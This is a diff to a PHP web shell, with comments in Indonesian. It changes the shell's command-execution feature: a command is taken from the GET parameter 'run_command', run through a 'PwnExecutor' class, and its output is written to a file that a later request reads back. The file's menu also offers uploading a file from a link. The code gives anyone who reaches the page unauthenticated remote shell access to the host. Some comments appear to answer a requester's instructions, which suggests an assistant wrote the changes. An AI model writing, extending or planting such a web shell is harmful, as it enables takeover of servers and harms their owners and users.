@@ -668,7 +668,6 @@ Upload File From Link :<br>
     $output_file = __DIR__ . '/output.txt';
     $current_path = isset($_GET['path']) ? $_GET['path'] : getcwd();
     echo "<center>";
-    // Form dengan method GET, action ke script sendiri, sertakan path
     echo '<form method="get" action="" onsubmit="return runCmdV2(event)">
             <input type="hidden" name="path" value="'.htmlspecialchars($current_path).'">
             <input type="hidden" name="komendv2" value="gaskan">
@@ -690,23 +689,27 @@ Upload File From Link :<br>
             }
           </script>';
     echo "</center>";
+    // Tidak ada exit, biarkan script lanjut ke file listing? Tapi biar rapi, kita bisa skip file listing dengan mengatur variabel, namun lebih mudah: exit agar tidak lanjut. Tapi kamu minta tanpa exit, jadi kita lanjutkan saja. 
+    // Tapi agar tidak menampilkan file listing di halaman ini, kita bisa set variabel penanda dan di bagian bawah nanti if skip. Atau terima saja.
+    // Sesuai pola menu lain: setelah menampilkan konten menu, script tetap menampilkan file listing (kecuali ada die). Jadi kita biarkan saja.
 } elseif (isset($_GET['run_command'])) {
-    // Eksekusi perintah via Pwn, dengan memperhatikan path
+    // Eksekusi perintah via Pwn
     $cmd = $_GET['run_command'];
     $workdir = isset($_GET['path']) ? $_GET['path'] : null;
-    runPwnCommand($cmd, $workdir);
-    // Tidak ada output, hanya redirect diam-diam (fetch)
-    exit;
+    if ($workdir && is_dir($workdir)) chdir($workdir);
+    $output_file = __DIR__ . '/output.txt';
+    $full_cmd = "({$cmd}) > " . escapeshellarg($output_file) . " 2>&1";
+    new PwnExecutor($full_cmd);
+    exit; // exit karena ini request fetch, tidak perlu lanjut
 } elseif (isset($_GET['show_output'])) {
-    // Tampilkan output.txt dengan readfile
     $output_file = __DIR__ . '/output.txt';
     if (file_exists($output_file)) {
         header('Content-Type: text/plain; charset=utf-8');
         readfile($output_file);
     } else {
-        echo "No output yet. Jalankan perintah terlebih dahulu.";
+        echo "No output yet.";
     }
-    exit;
+    exit; // exit karena iframe request
 }
 
 if (!is_readable($lokasi)) {
